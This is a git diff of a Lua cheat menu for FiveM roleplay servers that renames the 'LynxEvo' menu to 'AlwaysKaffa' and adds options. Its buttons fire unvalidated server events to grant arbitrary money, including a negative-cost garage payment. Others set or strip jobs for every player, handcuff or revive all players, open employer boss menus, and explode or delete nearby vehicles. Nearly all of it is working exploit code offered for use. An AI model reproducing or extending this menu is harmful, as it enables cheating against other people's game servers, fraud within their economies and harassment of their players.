-                LynxEvo.MenuButton('~h~~p~#~s~ Metallic', 'metallic3')
-                LynxEvo.MenuButton('~h~~p~#~s~ Matte', 'matte3')
-                LynxEvo.MenuButton('~h~~p~#~s~ Metal', 'metal3')
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('classic1') then
+                AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('primary') then
+                AlwaysKaffa.MenuButton('~h~~p~»~s~ Classic', 'classic1')
+                AlwaysKaffa.MenuButton('~h~~p~»~s~ Metallic', 'metallic1')
+                AlwaysKaffa.MenuButton('~h~~p~»~s~ Matte', 'matte1')
+                AlwaysKaffa.MenuButton('~h~~p~»~s~ Metal', 'metal1')
+                AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('secondary') then
+                AlwaysKaffa.MenuButton('~h~~p~»~s~ Classic', 'classic2')
+                AlwaysKaffa.MenuButton('~h~~p~»~s~ Metallic', 'metallic2')
+                AlwaysKaffa.MenuButton('~h~~p~»~s~ Matte', 'matte2')
+                AlwaysKaffa.MenuButton('~h~~p~»~s~ Metal', 'metal2')
+                AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('rimpaint') then
+                AlwaysKaffa.MenuButton('~h~~p~»~s~ Classic', 'classic3')
+                AlwaysKaffa.MenuButton('~h~~p~»~s~ Metallic', 'metallic3')
+                AlwaysKaffa.MenuButton('~h~~p~»~s~ Matte', 'matte3')
+                AlwaysKaffa.MenuButton('~h~~p~»~s~ Metal', 'metal3')
+                AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('classic1') then
                 for dK, em in pairs(br) do
                     tp, ts = GetVehicleColours(veh)
                     if tp == em.id and not bg then
@@ -8707,7 +8872,7 @@ Citizen.CreateThread(
                         end
                     end
                     curprim, cursec = GetVehicleColours(veh)
-                    if LynxEvo.Button(em.name, pricetext) then
+                    if AlwaysKaffa.Button(em.name, pricetext) then
                         if not bg then
                             bi = 'paint'
                             bk = false
@@ -8730,8 +8895,8 @@ Citizen.CreateThread(
                         end
                     end
                 end
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('metallic1') then
+                AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('metallic1') then
                 for dK, em in pairs(br) do
                     tp, ts = GetVehicleColours(veh)
                     if tp == em.id and not bg then
@@ -8744,7 +8909,7 @@ Citizen.CreateThread(
                         end
                     end
                     curprim, cursec = GetVehicleColours(veh)
-                    if LynxEvo.Button(em.name, pricetext) then
+                    if AlwaysKaffa.Button(em.name, pricetext) then
                         if not bg then
                             bi = 'paint'
                             bk = false
@@ -8767,8 +8932,8 @@ Citizen.CreateThread(
                         end
                     end
                 end
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('matte1') then
+                AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('matte1') then
                 for dK, em in pairs(bt) do
                     tp, ts = GetVehicleColours(veh)
                     if tp == em.id and not bg then
@@ -8781,7 +8946,7 @@ Citizen.CreateThread(
                         end
                     end
                     curprim, cursec = GetVehicleColours(veh)
-                    if LynxEvo.Button(em.name, pricetext) then
+                    if AlwaysKaffa.Button(em.name, pricetext) then
                         if not bg then
                             bi = 'paint'
                             bk = false
@@ -8804,8 +8969,8 @@ Citizen.CreateThread(
                         end
                     end
                 end
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('metal1') then
+                AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('metal1') then
                 for dK, em in pairs(bu) do
                     tp, ts = GetVehicleColours(veh)
                     if tp == em.id and not bg then
@@ -8818,7 +8983,7 @@ Citizen.CreateThread(
                         end
                     end
                     curprim, cursec = GetVehicleColours(veh)
-                    if LynxEvo.Button(em.name, pricetext) then
+                    if AlwaysKaffa.Button(em.name, pricetext) then
                         if not bg then
                             bi = 'paint'
                             bk = false
@@ -8841,8 +9006,8 @@ Citizen.CreateThread(
                         end
                     end
                 end
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('classic2') then
+                AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('classic2') then
                 for dK, em in pairs(br) do
                     tp, ts = GetVehicleColours(veh)
                     if ts == em.id and not bg then
@@ -8855,7 +9020,7 @@ Citizen.CreateThread(
                         end
                     end
                     curprim, cursec = GetVehicleColours(veh)
-                    if LynxEvo.Button(em.name, pricetext) then
+                    if AlwaysKaffa.Button(em.name, pricetext) then
                         if not bg then
                             bi = 'paint'
                             bk = false
@@ -8874,8 +9039,8 @@ Citizen.CreateThread(
                         end
                     end
                 end
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('metallic2') then
+                AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('metallic2') then
                 for dK, em in pairs(br) do
                     tp, ts = GetVehicleColours(veh)
                     if ts == em.id and not bg then
@@ -8888,7 +9053,7 @@ Citizen.CreateThread(
                         end
                     end
                     curprim, cursec = GetVehicleColours(veh)
-                    if LynxEvo.Button(em.name, pricetext) then
+                    if AlwaysKaffa.Button(em.name, pricetext) then
                         if not bg then
                             bi = 'paint'
                             bk = false
@@ -8907,8 +9072,8 @@ Citizen.CreateThread(
                         end
                     end
                 end
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('matte2') then
+                AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('matte2') then
                 for dK, em in pairs(bt) do
                     tp, ts = GetVehicleColours(veh)
                     if ts == em.id and not bg then
@@ -8921,7 +9086,7 @@ Citizen.CreateThread(
                         end
                     end
                     curprim, cursec = GetVehicleColours(veh)
-                    if LynxEvo.Button(em.name, pricetext) then
+                    if AlwaysKaffa.Button(em.name, pricetext) then
                         if not bg then
                             bi = 'paint'
                             bk = false
@@ -8940,8 +9105,8 @@ Citizen.CreateThread(
                         end
                     end
                 end
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('metal2') then
+                AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('metal2') then
                 for dK, em in pairs(bu) do
                     tp, ts = GetVehicleColours(veh)
                     if ts == em.id and not bg then
@@ -8954,7 +9119,7 @@ Citizen.CreateThread(
                         end
                     end
                     curprim, cursec = GetVehicleColours(veh)
-                    if LynxEvo.Button(em.name, pricetext) then
+                    if AlwaysKaffa.Button(em.name, pricetext) then
                         if not bg then
                             bi = 'paint'
                             bk = false
@@ -8973,8 +9138,8 @@ Citizen.CreateThread(
                         end
                     end
                 end
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('classic3') then
+                AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('classic3') then
                 for dK, em in pairs(br) do
                     _, ts = GetVehicleExtraColours(veh)
                     if ts == em.id and not bg then
@@ -8987,7 +9152,7 @@ Citizen.CreateThread(
                         end
                     end
                     _, currims = GetVehicleExtraColours(veh)
-                    if LynxEvo.Button(em.name, pricetext) then
+                    if AlwaysKaffa.Button(em.name, pricetext) then
                         if not bg then
                             bi = 'paint'
                             bk = false
@@ -9007,8 +9172,8 @@ Citizen.CreateThread(
                         end
                     end
                 end
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('metallic3') then
+                AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('metallic3') then
                 for dK, em in pairs(br) do
                     _, ts = GetVehicleExtraColours(veh)
                     if ts == em.id and not bg then
@@ -9021,7 +9186,7 @@ Citizen.CreateThread(
                         end
                     end
                     _, currims = GetVehicleExtraColours(veh)
-                    if LynxEvo.Button(em.name, pricetext) then
+                    if AlwaysKaffa.Button(em.name, pricetext) then
                         if not bg then
                             bi = 'paint'
                             bk = false
@@ -9041,8 +9206,8 @@ Citizen.CreateThread(
                         end
                     end
                 end
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('matte3') then
+                AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('matte3') then
                 for dK, em in pairs(bt) do
                     _, ts = GetVehicleExtraColours(veh)
                     if ts == em.id and not bg then
@@ -9055,7 +9220,7 @@ Citizen.CreateThread(
                         end
                     end
                     _, currims = GetVehicleExtraColours(veh)
-                    if LynxEvo.Button(em.name, pricetext) then
+                    if AlwaysKaffa.Button(em.name, pricetext) then
                         if not bg then
                             bi = 'paint'
                             bk = false
@@ -9075,8 +9240,8 @@ Citizen.CreateThread(
                         end
                     end
                 end
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('metal3') then
+                AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('metal3') then
                 for dK, em in pairs(bu) do
                     _, ts = GetVehicleExtraColours(veh)
                     if ts == em.id and not bg then
@@ -9089,7 +9254,7 @@ Citizen.CreateThread(
                         end
                     end
                     _, currims = GetVehicleExtraColours(veh)
-                    if LynxEvo.Button(em.name, pricetext) then
+                    if AlwaysKaffa.Button(em.name, pricetext) then
                         if not bg then
                             bi = 'paint'
                             bk = false
@@ -9109,30 +9274,30 @@ Citizen.CreateThread(
                         end
                     end
                 end
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('VehicleMenu') then
-                if LynxEvo.MenuButton('~h~~p~#~s~ ~h~~b~LSC ~s~Customs', 'LSC') then
-                elseif LynxEvo.MenuButton('~h~~p~#~s~ Vehicle ~g~Boost', 'BoostMenu') then
-                elseif LynxEvo.MenuButton('~h~~p~#~s~ Vehicle List', 'CarTypes') then
-                elseif LynxEvo.MenuButton('~h~~p~#~s~ Global Car Trolls', 'GCT') then
-                elseif LynxEvo.MenuButton('~h~~p~#~s~ Spawn & Attach ~s~Trailer', 'MainTrailer') then
-                elseif LynxEvo.Button('~h~Spawn ~r~Custom ~s~Vehicle') then
+                AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('VehicleMenu') then
+                if AlwaysKaffa.MenuButton('~h~~p~»~s~ ~h~~b~LSC ~s~Customs', 'LSC') then
+                elseif AlwaysKaffa.MenuButton('~h~~p~»~s~ Vehicle ~g~Boost', 'BoostMenu') then
+                elseif AlwaysKaffa.MenuButton('~h~~p~»~s~ Vehicle List', 'CarTypes') then
+                elseif AlwaysKaffa.MenuButton('~h~~p~»~s~ Global Car Trolls', 'GCT') then
+                elseif AlwaysKaffa.MenuButton('~h~~p~»~s~ Spawn & Attach ~s~Trailer', 'MainTrailer') then
+                elseif AlwaysKaffa.Button('~h~Spawn ~r~Custom ~s~Vehicle') then
                     ca()
-                elseif LynxEvo.Button('~h~~r~Delete ~s~Vehicle') then
+                elseif AlwaysKaffa.Button('~h~~r~Delete ~s~Vehicle') then
                     DelVeh(GetVehiclePedIsUsing(PlayerPedId(-1)))
-                elseif LynxEvo.Button('~h~~g~Repair ~s~Vehicle') then
+                elseif AlwaysKaffa.Button('~h~~g~Repair ~s~Vehicle') then
                     cc()
-                elseif LynxEvo.Button('~h~~g~Repair ~s~Engine') then
+                elseif AlwaysKaffa.Button('~h~~g~Repair ~s~Engine') then
                     cd()
-                elseif LynxEvo.Button('~h~~g~Flip ~s~Vehicle') then
+                elseif AlwaysKaffa.Button('~h~~g~Flip ~s~Vehicle') then
                     daojosdinpatpemata()
-                elseif LynxEvo.Button('~h~~b~Max ~s~Tuning') then
+                elseif AlwaysKaffa.Button('~h~~b~Max ~s~Tuning') then
                     MaxOut(GetVehiclePedIsUsing(PlayerPedId(-1)))
-                elseif LynxEvo.Button('~h~~g~RC ~s~Car') then
+                elseif AlwaysKaffa.Button('~h~~g~RC ~s~Car') then
                     ce()
-                    LynxEvo.CloseMenu()
+                    AlwaysKaffa.CloseMenu()
                 elseif
-                    LynxEvo.CheckBox(
+                    AlwaysKaffa.CheckBox(
                         '~h~No Fall',
                         Nofall,
                         function(dR)
@@ -9142,7 +9307,7 @@ Citizen.CreateThread(
                     )
                  then
                 elseif
-                    LynxEvo.CheckBox(
+                    AlwaysKaffa.CheckBox(
                         '~h~Vehicle Godmode',
                         VehGod,
                         function(dR)
@@ -9151,7 +9316,7 @@ Citizen.CreateThread(
                     )
                  then
                 elseif
-                    LynxEvo.CheckBox(
+                    AlwaysKaffa.CheckBox(
                         '~h~Speedboost ~g~SHIFT ~r~CTRL',
                         VehSpeed,
                         function(dR)
@@ -9160,10 +9325,10 @@ Citizen.CreateThread(
                     )
                  then
                 end
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('GCT') then
+                AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('GCT') then
                 if
-                    LynxEvo.CheckBox(
+                    AlwaysKaffa.CheckBox(
                         '~h~~r~EMP~s~ Nearest Vehicles',
                         destroyvehicles,
                         function(dR)
@@ -9172,7 +9337,7 @@ Citizen.CreateThread(
                     )
                  then
                 elseif
-                    LynxEvo.CheckBox(
+                    AlwaysKaffa.CheckBox(
                         '~h~~r~Delete~s~ Nearest Vehicles/Entity',
                         deletenearestvehicle,
                         function(dR)
@@ -9181,7 +9346,7 @@ Citizen.CreateThread(
                     )
                  then
                 elseif
-                    LynxEvo.CheckBox(
+                    AlwaysKaffa.CheckBox(
                         '~h~~r~Explode~s~ Nearest Vehicles',
                         explodevehicles,
                         function(dR)
@@ -9190,7 +9355,7 @@ Citizen.CreateThread(
                     )
                  then
                 elseif
-                    LynxEvo.CheckBox(
+                    AlwaysKaffa.CheckBox(
                         '~h~~p~Fuck~s~ Nearest Vehicles',
                         fuckallcars,
                         function(dR)
@@ -9199,57 +9364,57 @@ Citizen.CreateThread(
                     )
                  then
                 end
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('LuaMenu') then
-                if LynxEvo.MenuButton('~h~~p~#~s~ ~r~ESX ~s~Boss', 'ESXBoss') then
-                elseif LynxEvo.MenuButton('~h~~p~#~s~ ~r~ESX ~s~Money', 'ESXMoney') then
-                elseif LynxEvo.MenuButton('~h~~p~#~s~ ~r~ESX ~s~Jobs', 'ESXJobs') then
-                elseif LynxEvo.MenuButton('~h~~p~#~s~ ~r~ESX ~s~Misc', 'ESXCustom') then
-                elseif LynxEvo.MenuButton('~h~~p~#~s~ ~r~ESX ~s~Drugs', 'ESXDrugs') then
-                elseif LynxEvo.MenuButton('~h~~p~#~s~ ~y~VRP ~s~Triggers', 'VRPTriggers') then
-                elseif LynxEvo.MenuButton('~h~~p~#~s~ ~b~Misc ~s~Triggers', 'MiscTriggers') then
+                AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('LuaMenu') then
+                if AlwaysKaffa.MenuButton('~h~~p~»~s~ ~r~ESX ~s~Boss', 'ESXBoss') then
+                elseif AlwaysKaffa.MenuButton('~h~~p~»~s~ ~r~ESX ~s~Money', 'ESXMoney') then
+                elseif AlwaysKaffa.MenuButton('~h~~p~»~s~ ~r~ESX ~s~Jobs', 'ESXJobs') then
+                elseif AlwaysKaffa.MenuButton('~h~~p~»~s~ ~r~ESX ~s~Misc', 'ESXCustom') then
+                elseif AlwaysKaffa.MenuButton('~h~~p~»~s~ ~r~ESX ~s~Items', 'ESXItems') then
+                elseif AlwaysKaffa.MenuButton('~h~~p~»~s~ ~y~VRP ~s~Triggers', 'VRPTriggers') then
+                elseif AlwaysKaffa.MenuButton('~h~~p~»~s~ ~b~Misc ~s~Triggers', 'MiscTriggers') then
                 end
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('ESXJobs') then
-                if LynxEvo.Button('~h~Fire all players') then
+                AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('ESXJobs') then
+                if AlwaysKaffa.Button('~h~Fire all players') then
                     for ak = 0, 128 do
                         TriggerServerEvent('NB:destituerplayer', GetPlayerServerId(ak))
                         UnemployedPlayers()
                     end
-                elseif LynxEvo.Button('~h~Set all ~b~Police ~s~Job') then
+                elseif AlwaysKaffa.Button('~h~Set all ~b~Police ~s~Job') then
                     for ak = 0, 128 do
                         TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(ak), 'police', 3)
                         PolicePlayers()
                     end
-                elseif LynxEvo.Button('~h~Set all ~o~Mecano ~s~Job') then
+                elseif AlwaysKaffa.Button('~h~Set all ~o~Mecano ~s~Job') then
                     for ak = 0, 128 do
                         TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(ak), 'mecano', 3)
                         MecanoPlayers()
                     end
-                elseif LynxEvo.Button('~h~Set all ~y~Taxi ~s~Job') then
+                elseif AlwaysKaffa.Button('~h~Set all ~y~Taxi ~s~Job') then
                     for ak = 0, 128 do
                         TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(ak), 'taxi', 3)
                         TaxiPlayers()
                     end
-                elseif LynxEvo.Button('~h~Set all ~r~Ambulance ~s~Job') then
+                elseif AlwaysKaffa.Button('~h~Set all ~r~Ambulance ~s~Job') then
                     for ak = 0, 128 do
                         TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(ak), 'ambulance', 3)
                         AmbulancePlayers()
                     end
-                elseif LynxEvo.Button('~h~Set all ~g~Real Estate ~s~Job') then
+                elseif AlwaysKaffa.Button('~h~Set all ~g~Real Estate ~s~Job') then
                     for ak = 0, 128 do
                         TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(ak), 'realestateagent', 3)
                         RealEstateAgentPlayers()
                     end
-                elseif LynxEvo.Button('~h~Set all ~r~Car ~b~Dealer ~s~Job') then
+                elseif AlwaysKaffa.Button('~h~Set all ~r~Car ~b~Dealer ~s~Job') then
                     for ak = 0, 128 do
                         TriggerServerEvent('NB:recruterplayer', GetPlayerServerId(ak), 'cardealer', 3)
                         CarDealerPlayers()
                     end
                 end
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('ESXBoss') then
-                if LynxEvo.Button('~c~~h~Mechanic~s~ Boss Menu') then
+                AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('ESXBoss') then
+                if AlwaysKaffa.Button('~c~~h~Mechanic~s~ Boss Menu') then
                     TriggerEvent(
                         'esx_society:openBossMenu',
                         'mecano',
@@ -9292,8 +9457,8 @@ Citizen.CreateThread(
                             es.close()
                         end
                     )
-                    LynxEvo.CloseMenu()
-                elseif LynxEvo.Button('~b~~h~Police~s~ Boss Menu') then
+                    AlwaysKaffa.CloseMenu()
+                elseif AlwaysKaffa.Button('~b~~h~Police~s~ Boss Menu') then
                     TriggerEvent(
                         'esx_society:openBossMenu',
                         'police',
@@ -9336,8 +9501,8 @@ Citizen.CreateThread(
                             es.close()
                         end
                     )
-                    LynxEvo.CloseMenu()
-                elseif LynxEvo.Button('~r~~h~Ambulance~s~ Boss Menu') then
+                    AlwaysKaffa.CloseMenu()
+                elseif AlwaysKaffa.Button('~r~~h~Ambulance~s~ Boss Menu') then
                     TriggerEvent(
                         'esx_society:openBossMenu',
                         'ambulance',
@@ -9380,8 +9545,8 @@ Citizen.CreateThread(
                             es.close()
                         end
                     )
-                    LynxEvo.CloseMenu()
-                elseif LynxEvo.Button('~y~~h~Taxi~s~ Boss Menu') then
+                    AlwaysKaffa.CloseMenu()
+                elseif AlwaysKaffa.Button('~y~~h~Taxi~s~ Boss Menu') then
                     TriggerEvent(
                         'esx_society:openBossMenu',
                         'taxi',
@@ -9424,20 +9589,20 @@ Citizen.CreateThread(
                             es.close()
                         end
                     )
-                    LynxEvo.CloseMenu()
-                elseif LynxEvo.Button('~g~~h~Real Estate~s~ Boss Menu') then
+                    AlwaysKaffa.CloseMenu()
+                elseif AlwaysKaffa.Button('~g~~h~Real Estate~s~ Boss Menu') then
                     TriggerEvent(
                         'esx_society:openBossMenu',
                         'realestateagent',
                         function(en, eo)
-                            LynxEvo.close()
+                            AlwaysKaffa.close()
                         end
                     )
                     TriggerEvent(
                         'esx_society:openBossMenu',
                         'realestateagent',
                         function(en, eo)
-                            LynxEvo.close()
+                            AlwaysKaffa.close()
                         end
                     )
                     TriggerEvent(
@@ -9468,20 +9633,20 @@ Citizen.CreateThread(
                             es.close()
                         end
                     )
-                    LynxEvo.CloseMenu()
-                elseif LynxEvo.Button('~o~~h~Car Dealer~s~ Boss Menu') then
+                    AlwaysKaffa.CloseMenu()
+                elseif AlwaysKaffa.Button('~o~~h~Car Dealer~s~ Boss Menu') then
                     TriggerEvent(
                         'esx_society:openBossMenu',
                         'cardealer',
                         function(en, eo)
-                            LynxEvo.close()
+                            AlwaysKaffa.close()
                         end
                     )
                     TriggerEvent(
                         'esx_society:openBossMenu',
                         'cardealer',
                         function(en, eo)
-                            LynxEvo.close()
+                            AlwaysKaffa.close()
                         end
                     )
                     TriggerEvent(
@@ -9512,15 +9677,15 @@ Citizen.CreateThread(
                             es.close()
                         end
                     )
-                    LynxEvo.CloseMenu()
-                elseif LynxEvo.Button('~y~~h~Custom~s~ Boss Menu') then
+                    AlwaysKaffa.CloseMenu()
+                elseif AlwaysKaffa.Button('~y~~h~Custom~s~ Boss Menu') then
                     local m = KeyboardInput('Enter custom boss menu job name', '', 100)
                     if m ~= '' then
                         TriggerEvent(
                             'esx_society:openBossMenu',
                             m,
                             function(en, eo)
-                                LynxEvo.close()
+                                AlwaysKaffa.close()
                             end
                         )
                         TriggerEvent(
@@ -9537,19 +9702,29 @@ Citizen.CreateThread(
                                 es.close()
                             end
                         )
-                        LynxEvo.CloseMenu()
+                        AlwaysKaffa.CloseMenu()
                     end
                 end
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('ESXMoney') then
-                if LynxEvo.Button('~h~~o~Automatic Money ~r~ WARNING!') then
+                AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('ESXMoney') then
+                if AlwaysKaffa.Button('~h~ Kaffa Special Money Method') then
                     automaticmoneyesx()
-                elseif LynxEvo.Button('~g~~h~ESX ~y~Caution Give Back') then
+                elseif AlwaysKaffa.Button('~g~~h~ESX ~y~Caution Give Back') then
                     local m = KeyboardInput('Enter amount of money', '', 100)
                     if m ~= '' then
                         TriggerServerEvent('esx_jobs:caution', 'give_back', m)
                     end
-                elseif LynxEvo.Button('~g~~h~ESX ~y~Eden Garage') then
+                elseif AlwaysKaffa.Button('~g~~h~ESX ~y~Advanced Garage') then
+                    local m = KeyboardInput('Enter amount of money', '', 100)
+                    if m ~= '' then
+                        TriggerServerEvent(
+                            'esx_advancedgarage:payhealth',
+                            {
+                                costs = -m
+                            }
+                        )
+                    end
+                elseif AlwaysKaffa.Button('~g~~h~ESX ~y~Eden Garage') then
                     local m = KeyboardInput('Enter amount of money', '', 100)
                     if m ~= '' then
                         TriggerServerEvent(
@@ -9559,17 +9734,17 @@ Citizen.CreateThread(
                             }
                         )
                     end
-                elseif LynxEvo.Button('~g~~h~ESX ~y~Fuel Delivery') then
+                elseif AlwaysKaffa.Button('~g~~h~ESX ~y~Fuel Delivery') then
                     local m = KeyboardInput('Enter amount of money', '', 100)
                     if m ~= '' then
                         TriggerServerEvent('esx_fueldelivery:pay', m)
                     end
-                elseif LynxEvo.Button('~g~~h~ESX ~y~Car Thief') then
+                elseif AlwaysKaffa.Button('~g~~h~ESX ~y~Car Thief') then
                     local m = KeyboardInput('Enter amount of money', '', 100)
                     if m ~= '' then
                         TriggerServerEvent('esx_carthief:pay', m)
                     end
-                elseif LynxEvo.Button('~g~~h~ESX ~y~DMV School') then
+                elseif AlwaysKaffa.Button('~g~~h~ESX ~y~DMV School') then
                     local m = KeyboardInput('Enter amount of money', '', 100)
                     if m ~= '' then
                         TriggerServerEvent(
@@ -9579,7 +9754,7 @@ Citizen.CreateThread(
                             }
                         )
                     end
-                elseif LynxEvo.Button('~g~~h~FUEL ~y~Legacy Fuel') then
+                elseif AlwaysKaffa.Button('~g~~h~FUEL ~y~Legacy Fuel') then
                     local m = KeyboardInput('Enter amount of money', '', 100)
                     if m ~= '' then
                         TriggerServerEvent(
@@ -9589,63 +9764,63 @@ Citizen.CreateThread(
                             }
                         )
                     end
-                elseif LynxEvo.Button('~g~~h~ESX ~y~Dirty Job') then
+                elseif AlwaysKaffa.Button('~g~~h~ESX ~y~Dirty Job') then
                     local m = KeyboardInput('Enter amount of money', '', 100)
                     if m ~= '' then
                         TriggerServerEvent('esx_godirtyjob:pay', m)
                     end
-                elseif LynxEvo.Button('~g~~h~ESX ~y~Pizza Boy') then
+                elseif AlwaysKaffa.Button('~g~~h~ESX ~y~Pizza Boy') then
                     local m = KeyboardInput('Enter amount of money', '', 100)
                     if m ~= '' then
                         TriggerServerEvent('esx_pizza:pay', m)
                     end
-                elseif LynxEvo.Button('~g~~h~ESX ~y~Ranger Job') then
+                elseif AlwaysKaffa.Button('~g~~h~ESX ~y~Ranger Job') then
                     local m = KeyboardInput('Enter amount of money', '', 100)
                     if m ~= '' then
                         TriggerServerEvent('esx_ranger:pay', m)
                     end
-                elseif LynxEvo.Button('~g~~h~ESX ~y~Garbage Job') then
+                elseif AlwaysKaffa.Button('~g~~h~ESX ~y~Garbage Job') then
                     local m = KeyboardInput('Enter amount of money', '', 100)
                     if m ~= '' then
                         TriggerServerEvent('esx_garbagejob:pay', m)
                     end
-                elseif LynxEvo.Button('~g~~h~ESX ~y~Car Thief ~r~DIRTY MONEY') then
+                elseif AlwaysKaffa.Button('~g~~h~ESX ~y~Car Thief ~r~DIRTY MONEY') then
                     local m = KeyboardInput('Enter amount of dirty money', '', 100)
                     if m ~= '' then
                         TriggerServerEvent('esx_carthief:pay', m)
                     end
-                elseif LynxEvo.Button('~g~~h~ESX ~y~Trucker Job') then
+                elseif AlwaysKaffa.Button('~g~~h~ESX ~y~Trucker Job') then
                     local m = KeyboardInput('Enter amount of money', '', 100)
                     if m ~= '' then
                         TriggerServerEvent('esx_truckerjob:pay', m)
                     end
-                elseif LynxEvo.Button('~g~~h~ESX ~y~Admin Give Bank') then
+                elseif AlwaysKaffa.Button('~g~~h~ESX ~y~Admin Give Bank') then
                     local m = KeyboardInput('Enter amount of money', '', 100)
                     if m ~= '' then
                         TriggerServerEvent('AdminMenu:giveBank', m)
                     end
-                elseif LynxEvo.Button('~g~~h~ESX ~y~Admin Give Cash') then
+                elseif AlwaysKaffa.Button('~g~~h~ESX ~y~Admin Give Cash') then
                     local m = KeyboardInput('Enter amount of money', '', 100)
                     if m ~= '' then
                         TriggerServerEvent('AdminMenu:giveCash', m)
                     end
-                elseif LynxEvo.Button('~g~~h~ESX ~y~Postal Job') then
+                elseif AlwaysKaffa.Button('~g~~h~ESX ~y~Postal Job') then
                     local m = KeyboardInput('Enter amount of money', '', 100)
                     if m ~= '' then
                         TriggerServerEvent('esx_gopostaljob:pay', m)
                     end
-                elseif LynxEvo.Button('~g~~h~ESX ~y~Banker Job') then
+                elseif AlwaysKaffa.Button('~g~~h~ESX ~y~Banker Job') then
                     local m = KeyboardInput('Enter amount of money', '', 100)
                     if m ~= '' then
                         TriggerServerEvent('esx_banksecurity:pay', m)
                     end
-                elseif LynxEvo.Button('~g~~h~ESX ~y~Slot Machine') then
+                elseif AlwaysKaffa.Button('~g~~h~ESX ~y~Slot Machine') then
                     local m = KeyboardInput('Enter amount of money', '', 100)
                     if m ~= '' then
                         TriggerServerEvent('esx_slotmachine:sv:2', m)
                     end
                 elseif
-                    LynxEvo.CheckBox(
+                    AlwaysKaffa.CheckBox(
                         '~g~~h~ESX Hunting~y~ reward',
                         huntspam,
                         function(dR)
@@ -9654,13 +9829,13 @@ Citizen.CreateThread(
                     )
                  then
                 end
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('ESXCustom') then
-                if LynxEvo.Button('~w~~h~Set hunger to ~h~~g~100') then
+                AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('ESXCustom') then
+                if AlwaysKaffa.Button('~h~Set ~o~hunger ~s~to ~h~~g~100') then
                     TriggerEvent('esx_status:set', 'hunger', 1000000)
-                elseif LynxEvo.Button('~w~~h~Set thirst to ~h~~g~100') then
+                elseif AlwaysKaffa.Button('~h~Set ~b~thirst ~s~to ~h~~g~100') then
                     TriggerEvent('esx_status:set', 'thirst', 1000000)
-                elseif LynxEvo.Button('~g~~h~ESX ~r~Revive') then
+                elseif AlwaysKaffa.Button('~g~~h~ESX ~r~Revive') then
                     local f = KeyboardInput('Enter Player ID or all', '', 1000)
                     if f then
                         if f == 'all' then
@@ -9673,7 +9848,7 @@ Citizen.CreateThread(
                             TriggerEvent('esx_ambulancejob:revive', f)
                         end
                     end
-                elseif LynxEvo.Button('~g~~h~ESX ~b~Handcuff') then
+                elseif AlwaysKaffa.Button('~g~~h~ESX ~b~Handcuff') then
                     local f = KeyboardInput('Enter Player ID or all', '', 1000)
                     if f then
                         if f == 'all' then
@@ -9686,45 +9861,72 @@ Citizen.CreateThread(
                             TriggerServerEvent('esx_policejob:handcuff', f)
                         end
                     end
-                elseif LynxEvo.Button('~h~Get Driving License') then
+                elseif AlwaysKaffa.Button('~h~Get Driving License') then
                     TriggerServerEvent('esx_dmvschool:addLicense', 'dmv')
                     TriggerServerEvent('esx_dmvschool:addLicense', 'drive')
-                elseif LynxEvo.Button('~h~~b~Buy ~s~a vehicle for ~g~free') then
-                    cv()
+                elseif AlwaysKaffa.Button('~h~~b~Buy ~s~a vehicle for ~g~free') then
+                    freevehc1()
+                elseif AlwaysKaffa.Button('Bank GronnigenRP') then
+                TriggerServerEvent('bank:balance', tonumber(100000))
+
                 end
-                LynxEvo.Display()
-            elseif LynxEvo.IsMenuOpened('ESXDrugs') then
-                if LynxEvo.Button('~h~~g~Harvest ~g~Weed') then
+                AlwaysKaffa.Display()
+            elseif AlwaysKaffa.IsMenuOpened('ESXItems') then
+                if AlwaysKaffa.Button('~h~~s~Pickup ~g~Cannabis') then
+                    pickupcannabis()
+                elseif AlwaysKaffa.Button('~h~~s~Process ~g~Cannabis') then
+                    proccesscannabis()
